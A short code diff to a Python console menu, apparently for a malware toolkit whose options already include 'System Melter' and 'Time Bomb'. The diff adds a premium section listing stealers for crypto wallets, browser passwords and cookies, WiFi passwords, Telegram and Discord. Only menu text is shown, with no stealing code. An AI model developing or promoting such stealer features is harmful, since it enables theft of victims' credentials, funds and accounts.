@@ -1,7 +1,12 @@
 import time
 
 from files import colors
+from rgbprint import Color
 c = colors
+y = Color.yellow
+w = Color.white
+g = Color.green
+
 
 def menu():
     print(f"""
@@ -25,7 +30,16 @@ def menu():
     {c.c}[18]{c.lr} System Melter
     {c.c}[19]{c.lr} The Matrix
     {c.c}[20]{c.lr} Time Bomb{c.c}(Needs configuration)
+    
+    {w}[$] {y}Premium - Gold Mine
+    
+    {w}[21] {g}Crypto Wallet Stealer
+    {w}[22] {g}Browser Passwords, Cookies, Hist stealer
+    {w}[23] {g}Wifi Password Stealer
+    {w}[24] {g}Telegram Stealer
+    {w}[25] {g}Discord Stealer
     """)
+
 
 def sleep(n):
     time.sleep(n)
